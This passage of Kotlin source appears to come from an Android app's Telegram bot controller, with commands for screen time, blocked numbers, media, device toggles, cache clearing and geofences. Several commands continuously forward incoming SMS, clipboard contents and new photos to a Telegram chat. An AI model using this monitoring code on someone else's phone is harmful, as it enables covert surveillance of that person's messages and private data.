        val state = if (isOn) "🔇 <b>ON</b> (all calls and notifications silenced)" else "🔔 <b>OFF</b> (notifications active)"
        val rows = listOf(listOf("🔇 DND On" to "dnd_on", "🔔 DND Off" to "dnd_off"))
        val markup = TelegramApiClient.inlineKeyboard(rows)
        sendMessage("🔇 <b>Do Not Disturb</b>\nStatus: $state", replyMarkup = markup)
    }

    // ==================== /screentime ====================

    private fun cmdScreenTime(args: List<String>) {
        sendTyping()
        val days = (args.firstOrNull()?.toIntOrNull() ?: 1).coerceIn(1, 7)
        try {
            val usm = MainApp.instance.getSystemService(android.content.Context.USAGE_STATS_SERVICE) as android.app.usage.UsageStatsManager
            val now = System.currentTimeMillis()
            val start = now - days.toLong() * 24 * 60 * 60 * 1000
            val stats = usm.queryUsageStats(android.app.usage.UsageStatsManager.INTERVAL_DAILY, start, now)
            if (stats.isNullOrEmpty()) {
                sendMessage("⏱ No usage data. Make sure PlainApp has <b>Usage Access</b> permission (Settings → Apps → Special app access → Usage access).")
                return
            }
            val merged = mutableMapOf<String, Long>()
            stats.forEach { s ->
                if (s.totalTimeInForeground > 0) {
                    merged[s.packageName] = (merged[s.packageName] ?: 0L) + s.totalTimeInForeground
                }
            }
            val sorted = merged.entries.sortedByDescending { it.value }.take(20)
            val sb = StringBuilder("⏱ <b>Screen Time</b> · last $days day(s)\n━━━━━━━━━━━━━━━━━━━━\n")
            sorted.forEachIndexed { i, (pkg, ms) ->
                val appLabel = try { MainApp.instance.packageManager.getApplicationLabel(MainApp.instance.packageManager.getApplicationInfo(pkg, 0)).toString() } catch (_: Exception) { pkg }
                val h = ms / 3600000; val m = (ms % 3600000) / 60000
                val timeStr = if (h > 0) "${h}h ${m}m" else "${m}m"
                sb.append("${i + 1}. <b>${htmlEsc(appLabel.take(28))}</b>  $timeStr\n")
            }
            sendMessage(sb.toString())
        } catch (e: Exception) {
            sendMessage("❌ Screen time error: ${htmlEsc(e.message ?: "")}")
        }
    }

    // ==================== /blocknumber ====================

    private suspend fun cmdBlockNumber(args: List<String>) {
        sendTyping()
        if (args.isNotEmpty()) {
            val num = args.joinToString(" ").trim()
            val existing = BlockedNumberHelper.getAll()
            val match = existing.firstOrNull { it.number == num || it.normalizedNumber == num }
            if (match != null) {
                BlockedNumberHelper.delete(match.number)
                sendMessage("✅ Unblocked: <code>${htmlEsc(num)}</code>")
            } else {
                BlockedNumberHelper.add(num)
                sendMessage("🚫 Blocked: <code>${htmlEsc(num)}</code>")
            }
            return
        }
        renderBlockNumberPage(editMessageId = null)
    }

    private suspend fun renderBlockNumberPage(editMessageId: Long?) {
        try {
            val blocked = BlockedNumberHelper.getAll()
            val sb = StringBuilder("🚫 <b>Blocked Numbers</b> (${blocked.size})\n")
            if (blocked.isEmpty()) {
                sb.append("\n<i>No blocked numbers.</i>\n\nUse /blocknumber &lt;number&gt; to block one.")
                val rows = listOf(listOf("➕ Block a number" to "bn_add"))
                val markup = TelegramApiClient.inlineKeyboard(rows)
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
                else sendMessage(sb.toString(), replyMarkup = markup)
                return
            }
            sb.append("<i>Tap 🗑 to unblock immediately.</i>\n\n")
            val rows = mutableListOf<List<Pair<String, String>>>()
            blocked.take(20).forEachIndexed { i, b ->
                val name = lookupContactName(b.number)
                sb.append("${i + 1}. 🚫 <code>${htmlEsc(b.number)}</code>")
                if (name.isNotBlank()) sb.append("  <b>${htmlEsc(name)}</b>")
                sb.append("\n")
                val label = if (name.isNotBlank()) "${name.take(14)} (${b.number.takeLast(8)})" else b.number.take(24)
                rows.add(listOf("🗑 Unblock $label" to "bn_del:${phoneToken(b.number)}"))
            }
            if (blocked.size > 20) sb.append("\n<i>… and ${blocked.size - 20} more.</i>")
            rows.add(listOf("➕ Block a number" to "bn_add", "🔄 Refresh" to "bn_pg"))
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            val msg = "❌ Could not read blocked numbers: ${htmlEsc(e.message ?: "")}"
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
        }
    }

    // ==================== /nowplaying ====================

    private suspend fun cmdNowPlaying() {
        sendTyping()
        renderNowPlaying(editMessageId = null)
    }

    private suspend fun renderNowPlaying(editMessageId: Long?) {
        try {
            // MediaController requires all property reads on the main thread
            val (isPlaying, pos) = withContext(kotlinx.coroutines.Dispatchers.Main) {
                AudioPlayer.isPlaying() to AudioPlayer.playerProgress
            }
            val ctx = MainApp.instance
            val playingPath = com.ismartcoding.plain.preferences.AudioPlayingPreference.getValueAsync(ctx)
            val sb = StringBuilder("🎵 <b>Now Playing</b>\n━━━━━━━━━━━━━━━━━━━━\n")
            if (playingPath.isBlank()) {
                sb.append("<i>Nothing is loaded yet.</i>\n\nUse /music to browse the library.")
                val markup = TelegramApiClient.inlineKeyboard(listOf(listOf("🎵 Music library" to "music_cmd")))
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
                else sendMessage(sb.toString(), replyMarkup = markup)
                return
            }
            val fileName = java.io.File(playingPath).nameWithoutExtension
            sb.append("🎵 <b>${htmlEsc(fileName)}</b>\n")
            val posStr = "${pos / 60000}:${((pos % 60000) / 1000).toString().padStart(2, '0')}"
            sb.append("⏱ Position: $posStr\n")
            sb.append("Status: ${if (isPlaying) "▶️ Playing" else "⏸ Paused"}\n")
            val playPause = if (isPlaying) "⏸ Pause" to "np_pause" else "▶️ Play" to "np_play"
            val rows = listOf(
                listOf("⏮ Prev" to "np_prev", playPause, "⏭ Next" to "np_next"),
                listOf("🔄 Refresh" to "np_refresh"),
            )
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            val msg = "❌ Player error: ${htmlEsc(e.message ?: "")}"
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
        }
    }

    // ==================== /forwardsms ====================

    private fun cmdForwardSms(args: List<String>) {
        val setEnabled = when (args.firstOrNull()?.lowercase()) {
            "on", "1", "true", "enable" -> true
            "off", "0", "false", "disable" -> false
            else -> null
        }
        if (setEnabled != null) forwardSmsEnabled = setEnabled else forwardSmsEnabled = !forwardSmsEnabled
        coIO { TelegramBotForwardSmsPreference.putAsync(MainApp.instance, forwardSmsEnabled) }
        val state = if (forwardSmsEnabled) "✅ <b>ON</b> — incoming SMS will be forwarded to this chat" else "🔕 <b>OFF</b> — SMS forwarding is paused"
        val rows = listOf(listOf("✅ Enable" to "smsfwd_on", "🔕 Disable" to "smsfwd_off"))
        sendMessage("📩 <b>SMS Forwarding</b>\nStatus: $state", replyMarkup = TelegramApiClient.inlineKeyboard(rows))
    }

    // ==================== /clipboard ====================

    @Volatile private var forwardClipboardEnabled: Boolean = false
    @Volatile private var lastClipboardText: String = ""
    private var clipboardMonitorJob: kotlinx.coroutines.Job? = null

    private suspend fun cmdClipboard(argText: String) {
        sendTyping()
        val ctx = MainApp.instance
        val cm = ctx.getSystemService(android.content.Context.CLIPBOARD_SERVICE) as? android.content.ClipboardManager
        if (argText.isNotBlank()) {
            try {
                val clip = android.content.ClipData.newPlainText("plain", argText)
                cm?.setPrimaryClip(clip)
                sendMessage("✅ Clipboard set to:\n<pre>${htmlEsc(argText.take(1000))}</pre>")
            } catch (e: Exception) {
                sendMessage("❌ Could not set clipboard: ${htmlEsc(e.message ?: "")}")
            }
            return
        }
        try {
            val item = cm?.primaryClip?.getItemAt(0)
            val text = item?.coerceToText(ctx)?.toString()
            if (text.isNullOrBlank()) {
                sendMessage("📋 <b>Clipboard</b>\n<i>Empty or inaccessible (Android 10+ restricts background clipboard reads).</i>")
            } else {
                sendMessage("📋 <b>Clipboard</b>\n<pre>${htmlEsc(text.take(2000))}</pre>${if (text.length > 2000) "\n<i>… truncated (${text.length} chars)</i>" else ""}")
            }
        } catch (e: Exception) {
            sendMessage("❌ Clipboard access error: ${htmlEsc(e.message ?: "")}\n<i>Android 10+ restricts background clipboard reads.</i>")
        }
    }

    private fun cmdForwardClipboard(args: List<String>) {
        val setEnabled = when (args.firstOrNull()?.lowercase()) {
            "on", "1", "true", "enable" -> true
            "off", "0", "false", "disable" -> false
            else -> null
        }
        if (setEnabled != null) forwardClipboardEnabled = setEnabled else forwardClipboardEnabled = !forwardClipboardEnabled
        if (forwardClipboardEnabled) {
            startClipboardMonitor()
        } else {
            clipboardMonitorJob?.cancel()
            clipboardMonitorJob = null
        }
        val state = if (forwardClipboardEnabled) "✅ <b>ON</b> — clipboard changes will be forwarded here" else "🔕 <b>OFF</b> — monitoring paused"
        val rows = listOf(listOf("✅ Enable" to "clipfwd_on", "🔕 Disable" to "clipfwd_off"))
        sendMessage("📋 <b>Clipboard Forwarding</b>\nStatus: $state", replyMarkup = TelegramApiClient.inlineKeyboard(rows))
    }

    private fun startClipboardMonitor() {
        clipboardMonitorJob?.cancel()
        clipboardMonitorJob = scope.launch {
            while (forwardClipboardEnabled && isActive) {
                try {
                    val ctx = MainApp.instance
                    val cm = ctx.getSystemService(android.content.Context.CLIPBOARD_SERVICE) as? android.content.ClipboardManager
                    val text = cm?.primaryClip?.getItemAt(0)?.coerceToText(ctx)?.toString() ?: ""
                    if (text.isNotBlank() && text != lastClipboardText) {
                        lastClipboardText = text
                        sendMessage("📋 <b>Clipboard changed:</b>\n<pre>${htmlEsc(text.take(1500))}</pre>")
                    }
                } catch (_: Throwable) {}
                kotlinx.coroutines.delay(30_000L)
            }
        }
    }

    // ==================== /mobiledata ====================

    private suspend fun cmdMobileData(args: List<String>) {
        sendTyping()
        val ctx = MainApp.instance
        val tm = ctx.getSystemService(android.content.Context.TELEPHONY_SERVICE) as? android.telephony.TelephonyManager
        val cm = ctx.getSystemService(android.content.Context.CONNECTIVITY_SERVICE) as? android.net.ConnectivityManager

        val setEnabled = when (args.firstOrNull()?.lowercase()) {
            "on", "1", "true", "enable" -> true
            "off", "0", "false", "disable" -> false
            else -> null
        }

        if (setEnabled != null) {
            val ok = trySetMobileData(ctx, tm, setEnabled)
            if (ok) {
                sendMessage("✅ Mobile data turned ${if (setEnabled) "ON" else "OFF"}.")
            } else {
                sendMessage("❌ Could not toggle mobile data.\n<i>Requires MODIFY_PHONE_STATE permission or privileged system access.\nOn most Android 10+ devices this needs root or a system app.</i>")
            }
            return
        }

        val sb = StringBuilder("📡 <b>Mobile Data</b>\n━━━━━━━━━━━━━━━━━━━━\n")
        try {
            val network = cm?.activeNetwork
            val nc = cm?.getNetworkCapabilities(network)
            val hasMobile = nc?.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR) == true
            sb.append("Status: ${if (hasMobile) "🟢 Active (cellular)" else "⚪ Not active via cellular"}\n")
            if (tm != null) {
                sb.append("Network operator: ${tm.networkOperatorName.ifBlank { "unknown" }}\n")
                sb.append("Data state: ${datStateStr(tm.dataState)}\n")
                sb.append("SIM state: ${simStateStr(tm.simState)}\n")
            }
        } catch (e: Exception) {
            sb.append("Status read error: ${htmlEsc(e.message ?: "")}\n")
        }
        val rows = listOf(
            listOf("📡 Turn ON" to "mdata_on", "📴 Turn OFF" to "mdata_off"),
        )
        sendMessage(sb.toString(), replyMarkup = TelegramApiClient.inlineKeyboard(rows))
    }

    private fun trySetMobileData(ctx: android.content.Context, tm: android.telephony.TelephonyManager?, enable: Boolean): Boolean {
        if (tm == null) return false
        return try {
            val m = tm.javaClass.getDeclaredMethod("setDataEnabled", Boolean::class.java)
            m.isAccessible = true
            m.invoke(tm, enable)
            true
        } catch (_: Throwable) {
            try {
                val m = tm.javaClass.getDeclaredMethod("setMobileDataEnabled", Boolean::class.java)
                m.isAccessible = true
                m.invoke(tm, enable)
                true
            } catch (_: Throwable) { false }
        }
    }

    private fun datStateStr(s: Int): String = when (s) {
        android.telephony.TelephonyManager.DATA_CONNECTED -> "connected"
        android.telephony.TelephonyManager.DATA_CONNECTING -> "connecting"
        android.telephony.TelephonyManager.DATA_DISCONNECTED -> "disconnected"
        android.telephony.TelephonyManager.DATA_SUSPENDED -> "suspended"
        else -> "unknown($s)"
    }

    private fun simStateStr(s: Int): String = when (s) {
        android.telephony.TelephonyManager.SIM_STATE_READY -> "ready"
        android.telephony.TelephonyManager.SIM_STATE_ABSENT -> "absent"
        android.telephony.TelephonyManager.SIM_STATE_PIN_REQUIRED -> "PIN required"
        android.telephony.TelephonyManager.SIM_STATE_PUK_REQUIRED -> "PUK required"
        android.telephony.TelephonyManager.SIM_STATE_NETWORK_LOCKED -> "network locked"
        else -> "other"
    }

    // ==================== /bluetooth ====================

    private suspend fun cmdBluetooth(args: List<String>) {
        sendTyping()
        val setEnabled = when (args.firstOrNull()?.lowercase()) {
            "on", "1", "true", "enable" -> true
            "off", "0", "false", "disable" -> false
            else -> null
        }
        if (setEnabled != null) {
            val ok = BluetoothControlHelper.setEnabled(setEnabled)
            if (ok) {
                kotlinx.coroutines.delay(1200)
                renderBluetoothState(editMessageId = null)
            } else {
                sendMessage("❌ Could not toggle Bluetooth.\n<i>On Android 13+ direct enable/disable is deprecated and may require user action via Settings.</i>")
            }
            return
        }
        renderBluetoothState(editMessageId = null)
    }

    private suspend fun renderBluetoothState(editMessageId: Long?) {
        val st = BluetoothControlHelper.state()
        val sb = StringBuilder("🔵 <b>Bluetooth</b>\n━━━━━━━━━━━━━━━━━━━━\n")
        if (!st.supported) {
            sb.append("<i>Bluetooth is not supported on this device.</i>")
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString())
            else sendMessage(sb.toString())
            return
        }
        sb.append("Status: ${if (st.enabled) "🟢 Enabled" else "🔴 Disabled"}\n")
        sb.append("Paired devices: ${st.pairedCount}\n")
        sb.append("Nearby (BLE): ${st.nearbyCount}\n\n")
        if (st.enabled && st.hasConnectPermission) {
            val paired = BluetoothControlHelper.pairedList()
            if (paired.isNotEmpty()) {
                sb.append("<b>Paired devices:</b>\n")
                paired.take(10).forEach { d ->
                    val nearStr = if (d.nearby) " 🔵" else ""
                    sb.append("• ${htmlEsc(d.name.ifBlank { "Unknown" })} <code>${d.address}</code>$nearStr · ${d.type}\n")
                }
                if (paired.size > 10) sb.append("  … and ${paired.size - 10} more\n")
            }
        }
        val rows = mutableListOf<List<Pair<String, String>>>()
        if (st.enabled) {
            rows.add(listOf("🔴 Turn OFF" to "blue_off", "🔄 Refresh" to "blue_refresh"))
        } else {
            rows.add(listOf("🟢 Turn ON" to "blue_on", "🔄 Refresh" to "blue_refresh"))
        }
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
        else sendMessage(sb.toString(), replyMarkup = markup)
    }

    // ==================== /lockscreen ====================

    private suspend fun cmdLockScreen() {
        sendTyping()
        val ctx = MainApp.instance
        if (!DeviceAdminGuard.isAdminActive(ctx)) {
            sendMessage("❌ <b>Device Admin not active</b>\n\nPlainApp needs to be granted Device Administrator privileges to lock the screen.\n\nGo to: <b>Settings → Security → Device admin apps → PlainApp → Activate</b>")
            return
        }
        try {
            val dpm = ctx.getSystemService(android.content.Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            sendMessage("🔒 Locking screen…")
            dpm.lockNow()
        } catch (e: Exception) {
            sendMessage("❌ Could not lock screen: ${htmlEsc(e.message ?: "")}")
        }
    }

    // ==================== /forwardphotos ====================

    @Volatile private var forwardPhotosEnabled: Boolean = false
    @Volatile private var lastPhotoTimestamp: Long = System.currentTimeMillis()
    private var photoMonitorJob: kotlinx.coroutines.Job? = null

    private fun cmdForwardPhotos(args: List<String>) {
        val setEnabled = when (args.firstOrNull()?.lowercase()) {
            "on", "1", "true", "enable" -> true
            "off", "0", "false", "disable" -> false
            else -> null
        }
        if (setEnabled != null) forwardPhotosEnabled = setEnabled else forwardPhotosEnabled = !forwardPhotosEnabled
        if (forwardPhotosEnabled) {
            lastPhotoTimestamp = System.currentTimeMillis()
            startPhotoMonitor()
        } else {
            photoMonitorJob?.cancel()
            photoMonitorJob = null
        }
        val state = if (forwardPhotosEnabled) "✅ <b>ON</b> — new photos will be forwarded here" else "🔕 <b>OFF</b> — monitoring paused"
        val rows = listOf(listOf("✅ Enable" to "photofwd_on", "🔕 Disable" to "photofwd_off"))
        sendMessage("📷 <b>Photo Forwarding</b>\nStatus: $state", replyMarkup = TelegramApiClient.inlineKeyboard(rows))
    }

    private fun startPhotoMonitor() {
        photoMonitorJob?.cancel()
        photoMonitorJob = scope.launch {
            while (forwardPhotosEnabled && isActive) {
                kotlinx.coroutines.delay(30_000L)
                try {
                    val ctx = MainApp.instance
                    val uri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI
                    val proj = arrayOf(
                        android.provider.MediaStore.Images.Media._ID,
                        android.provider.MediaStore.Images.Media.DATA,
                        android.provider.MediaStore.Images.Media.DATE_ADDED,
                        android.provider.MediaStore.Images.Media.DISPLAY_NAME,
                    )
                    val since = lastPhotoTimestamp / 1000
                    ctx.contentResolver.query(
                        uri, proj,
                        "${android.provider.MediaStore.Images.Media.DATE_ADDED} > ?",
                        arrayOf(since.toString()),
                        "${android.provider.MediaStore.Images.Media.DATE_ADDED} ASC",
                    )?.use { cursor ->
                        while (cursor.moveToNext()) {
                            val path = cursor.getString(cursor.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.DATA)) ?: continue
                            val added = cursor.getLong(cursor.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.DATE_ADDED))
                            val name = cursor.getString(cursor.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.DISPLAY_NAME)) ?: "photo"
                            lastPhotoTimestamp = added * 1000 + 1
                            val file = java.io.File(path)
                            if (!file.exists() || file.length() == 0L) continue
                            try {
                                TelegramApiClient.sendPhoto(token, chatId, file, caption = "📷 New photo: ${htmlEsc(name)}")
                            } catch (_: Throwable) {}
                        }
                    }
                } catch (_: Throwable) {}
            }
        }
    }

    // ==================== /airplane ====================

    private suspend fun cmdAirplane(args: List<String>) {
        sendTyping()
        val ctx = MainApp.instance
        val setEnabled = when (args.firstOrNull()?.lowercase()) {
            "on", "1", "true", "enable" -> true
            "off", "0", "false", "disable" -> false
            else -> null
        }
        val current = android.provider.Settings.Global.getInt(ctx.contentResolver, android.provider.Settings.Global.AIRPLANE_MODE_ON, 0) != 0
        val sb = StringBuilder("✈️ <b>Airplane Mode</b>\n━━━━━━━━━━━━━━━━━━━━\n")
        sb.append("Current: ${if (current) "🟢 ON" else "🔴 OFF"}\n\n")
        if (setEnabled != null) {
            val ok = trySetAirplaneMode(ctx, setEnabled)
            if (ok) {
                sendMessage("✅ Airplane mode turned ${if (setEnabled) "ON" else "OFF"}.\n<i>Note: some devices require root for this to take effect.</i>")
            } else {
                sendMessage("❌ Could not toggle airplane mode.\n<i>Requires WRITE_SECURE_SETTINGS or root access. This is a system-protected setting on Android 4.2+.</i>")
            }
            return
        }
        sb.append("<i>Toggling airplane mode requires WRITE_SECURE_SETTINGS or root on Android 4.2+.</i>")
        val rows = listOf(
            listOf("✈️ Turn ON" to "air_on", "🛬 Turn OFF" to "air_off"),
        )
        sendMessage(sb.toString(), replyMarkup = TelegramApiClient.inlineKeyboard(rows))
    }

    private fun trySetAirplaneMode(ctx: android.content.Context, enable: Boolean): Boolean {
        return try {
            android.provider.Settings.Global.putInt(ctx.contentResolver, android.provider.Settings.Global.AIRPLANE_MODE_ON, if (enable) 1 else 0)
            val intent = android.content.Intent(android.content.Intent.ACTION_AIRPLANE_MODE_CHANGED)
                .addFlags(android.content.Intent.FLAG_RECEIVER_REPLACE_PENDING)
                .putExtra("state", enable)
            ctx.sendBroadcast(intent)
            true
        } catch (_: Throwable) { false }
    }

    // ==================== /schedulesms ====================

    private suspend fun cmdScheduleSms(args: List<String>) {
        sendTyping()
        if (args.size < 3) {
            sendMessage("⏰ <b>Schedule SMS</b>\n\nUsage:\n<code>/schedulesms &lt;number&gt; &lt;delay_seconds&gt; &lt;message text&gt;</code>\n\nExample:\n<code>/schedulesms +15551234567 60 Hey, this was scheduled!</code>")
            return
        }
        val number = args[0]
        val delaySec = args[1].toLongOrNull()
        if (delaySec == null || delaySec < 1 || delaySec > 86400) {
            sendMessage("❌ Invalid delay. Use seconds between 1 and 86400 (24 hours).")
            return
        }
        val body = args.drop(2).joinToString(" ")
        sendMessage("⏰ SMS to <code>${htmlEsc(number)}</code> scheduled in <b>${delaySec}s</b>:\n<i>${htmlEsc(body.take(200))}</i>")
        scope.launch {
            kotlinx.coroutines.delay(delaySec * 1000L)
            try {
                SmsHelper.sendText(number, body)
                sendMessage("✅ Scheduled SMS sent to <code>${htmlEsc(number)}</code>:\n<i>${htmlEsc(body.take(200))}</i>")
            } catch (e: Exception) {
                sendMessage("❌ Scheduled SMS failed: ${htmlEsc(e.message ?: "")}")
            }
        }
    }

    // ==================== /batteryhistory ====================

    private suspend fun cmdBatteryHistory(args: List<String>) {
        sendTyping()
        val hours = args.firstOrNull()?.toIntOrNull()?.coerceIn(1, 720) ?: 24
        val days = ((hours + 23) / 24).coerceAtLeast(1)
        val win = BatteryHistoryHelper.window(days)
        val cutoff = System.currentTimeMillis() - hours * 3600_000L
        val samples = win.samples.filter { it.ts >= cutoff }
        val sb = StringBuilder("🔋 <b>Battery History — last ${hours}h</b>\n━━━━━━━━━━━━━━━━━━━━\n")
        sb.append("Current: ${win.currentLevel}% · ${if (win.charging) "⚡ Charging (${win.plugged})" else "🔋 Discharging"}\n\n")
        if (samples.isEmpty()) {
            sb.append("<i>No recorded samples yet. Battery sampling starts once the app's background service is active.</i>")
        } else {
            val barWidth = 20
            val buckets = 10
            val step = (samples.size.toFloat() / buckets).coerceAtLeast(1f)
            sb.append("<b>Level chart (${samples.size} samples):</b>\n<pre>")
            for (b in 0 until minOf(buckets, samples.size)) {
                val idx = (b * step).toInt().coerceAtMost(samples.size - 1)
                val s = samples[idx]
                val bars = ((s.level * barWidth) / 100).coerceIn(0, barWidth)
                val plugStr = if (s.plugged > 0) "⚡" else "  "
                sb.append("${fmtTime(s.ts).takeLast(5)} ${s.level.toString().padStart(3)}% $plugStr ${"█".repeat(bars)}${"░".repeat(barWidth - bars)}\n")
            }
            sb.append("</pre>")
            val first = samples.first()
            val last = samples.last()
            val diffLevel = last.level - first.level
            val diffHours = (last.ts - first.ts) / 3600_000.0
            if (diffHours > 0 && diffLevel < 0) {
                val drainPerHour = (-diffLevel / diffHours)
                val etaHours = if (drainPerHour > 0) last.level / drainPerHour else 0.0
                sb.append("\nDrain rate: <b>${String.format("%.1f", drainPerHour)}%/h</b>")
                if (!win.charging && etaHours > 0) {
                    sb.append(" · Est. empty in <b>${String.format("%.1f", etaHours)}h</b>")
                }
            }
        }
        sendMessage(sb.toString())
    }

    // ==================== /vpn ====================

    private suspend fun cmdVpn() {
        sendTyping()
        val ctx = MainApp.instance
        val cm = ctx.getSystemService(android.content.Context.CONNECTIVITY_SERVICE) as? android.net.ConnectivityManager
        val sb = StringBuilder("🔐 <b>VPN Status</b>\n━━━━━━━━━━━━━━━━━━━━\n")
        if (cm == null) {
            sb.append("<i>ConnectivityManager unavailable.</i>")
            sendMessage(sb.toString()); return
        }
        try {
            var vpnActive = false
            var vpnNetwork: android.net.Network? = null
            val networks = cm.allNetworks
            for (net in networks) {
                val nc = cm.getNetworkCapabilities(net) ?: continue
                if (nc.hasTransport(android.net.NetworkCapabilities.TRANSPORT_VPN)) {
                    vpnActive = true
                    vpnNetwork = net
                    break
                }
            }
            if (vpnActive) {
                val li = vpnNetwork?.let { cm.getLinkProperties(it) }
                sb.append("Status: 🟢 <b>VPN Connected</b>\n")
                val iface = li?.interfaceName
                if (iface != null) sb.append("Interface: <code>$iface</code>\n")
                val addrs = li?.linkAddresses?.joinToString(", ") { it.address.hostAddress ?: "" }
                if (!addrs.isNullOrBlank()) sb.append("VPN IP: <code>$addrs</code>\n")
                val dns = li?.dnsServers?.joinToString(", ") { it.hostAddress ?: "" }
                if (!dns.isNullOrBlank()) sb.append("DNS: <code>$dns</code>\n")
            } else {
                sb.append("Status: 🔴 <b>No VPN active</b>\n\n<i>No VPN transport detected on any network interface.</i>")
            }
            val activeNet = cm.activeNetwork
            val activeNc = cm.getNetworkCapabilities(activeNet)
            if (activeNc != null) {
                sb.append("\n<b>Active network:</b>\n")
                if (activeNc.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI)) sb.append("• Wi-Fi\n")
                if (activeNc.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR)) sb.append("• Cellular\n")
                if (activeNc.hasTransport(android.net.NetworkCapabilities.TRANSPORT_ETHERNET)) sb.append("• Ethernet\n")
            }
        } catch (e: Exception) {
            sb.append("Error reading VPN status: ${htmlEsc(e.message ?: "")}")
        }
        sendMessage(sb.toString())
    }

    // ==================== /clearcache ====================

    private suspend fun cmdClearCache(args: List<String>) {
        sendTyping()
        val q = args.joinToString(" ").trim()
        renderClearCachePage(q, 0, editMessageId = null)
    }

    private suspend fun renderClearCachePage(query: String, offset: Int, editMessageId: Long?) {
        val ctx = MainApp.instance
        val pm = ctx.packageManager
        val all = try {
            pm.getInstalledApplications(android.content.pm.PackageManager.GET_META_DATA)
        } catch (_: Throwable) { emptyList() }
        val filtered = if (query.isBlank()) {
            all.filter { it.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM == 0 }
        } else {
            val q = query.lowercase()
            all.filter { pm.getApplicationLabel(it).toString().lowercase().contains(q) || it.packageName.lowercase().contains(q) }
        }
        val pageSize = 8
        val total = filtered.size
        val page = filtered.drop(offset).take(pageSize)
        if (page.isEmpty()) {
            val msg = if (offset == 0) "🗑 No apps found${if (query.isNotBlank()) " matching \"${htmlEsc(query)}\"" else ""}." else "🗑 No more apps."
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
            return
        }
        val sb = StringBuilder("🗑 <b>Clear App Cache</b> · ${offset + 1}–${offset + page.size} of $total\n<i>Tap an app to clear its cache.</i>\n\n")
        val rows = mutableListOf<List<Pair<String, String>>>()
        page.forEachIndexed { i, ai ->
            val label = pm.getApplicationLabel(ai).toString()
            val cacheDir = java.io.File(ai.dataDir, "cache")
            val cacheSize = if (cacheDir.exists()) dirSize(cacheDir) else 0L
            val sizeStr = if (cacheSize > 0) " (${formatBytes(cacheSize)})" else ""
            sb.append("${offset + i + 1}. <b>${htmlEsc(label.take(40))}</b>$sizeStr\n")
            val tok = pkgToken(ai.packageName)
            rows.add(listOf("🗑 Clear: ${label.take(22)}" to "cc_pick:$tok"))
        }
        val qSeg = safeSeg(query.ifBlank { "_" })
        val nav = mutableListOf<Pair<String, String>>()
        if (offset > 0) nav.add("◀️ Prev" to "cc_pg:$qSeg:${(offset - pageSize).coerceAtLeast(0)}")
        if (offset + pageSize < total) nav.add("Next ▶️" to "cc_pg:$qSeg:${offset + pageSize}")
        if (nav.isNotEmpty()) rows.add(nav)
        rows.add(listOf("🔍 Search" to "cc_q"))
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
        else sendMessage(sb.toString(), replyMarkup = markup)
    }

    private fun clearAppCache(packageName: String): Boolean {
        val ctx = MainApp.instance
        return try {
            val ai = ctx.packageManager.getApplicationInfo(packageName, 0)
            val cacheDir = java.io.File(ai.dataDir, "cache")
            if (cacheDir.exists()) {
                cacheDir.deleteRecursively()
                true
            } else {
                // Also try externalCacheDir path heuristic
                val extCache = java.io.File(android.os.Environment.getExternalStorageDirectory(), "Android/data/$packageName/cache")
                if (extCache.exists()) { extCache.deleteRecursively(); true } else false
            }
        } catch (_: Throwable) { false }
    }

    private fun dirSize(dir: java.io.File): Long {
        var size = 0L
        dir.walkTopDown().forEach { f -> if (f.isFile) size += f.length() }
        return size
    }

    private fun formatBytes(bytes: Long): String = when {
        bytes < 1024L -> "${bytes}B"
        bytes < 1024L * 1024L -> "${bytes / 1024}KB"
        bytes < 1024L * 1024L * 1024L -> "${bytes / (1024 * 1024)}MB"
        else -> String.format("%.1fGB", bytes / (1024.0 * 1024.0 * 1024.0))
    }

    // ==================== /geofence ====================

    private suspend fun cmdGeofence(args: List<String>) {
        sendTyping()
        when (args.firstOrNull()?.lowercase()) {
            "events" -> renderGeofenceEvents(editMessageId = null)
            "add" -> {
                pendingInput = "gf_new"
                sendMessage("🗺 <b>Add geofence</b>\n\nSend in format:\n<code>Name, lat, lng, radius_m</code>\n\nExample:\n<code>Home, 28.6139, 77.2090, 200</code>\n\nSend any /command to cancel.")
            }
            else -> renderGeofenceList(editMessageId = null)
        }
    }

    private suspend fun renderGeofenceList(editMessageId: Long?) {
        val fences = GeofencingHelper.listFences()
        val sb = StringBuilder("🗺 <b>Geofences</b> (${fences.size})\n━━━━━━━━━━━━━━━━━━━━\n")
        val rows = mutableListOf<List<Pair<String, String>>>()
        if (fences.isEmpty()) {
            sb.append("<i>No geofences defined yet.</i>\n\nTap ➕ Add to create one.")
        } else {
            fences.take(20).forEachIndexed { i, f ->
                val onOff = if (f.enabled) "🟢" else "⚪"
                sb.append("${i + 1}. $onOff <b>${htmlEsc(f.name)}</b>\n")
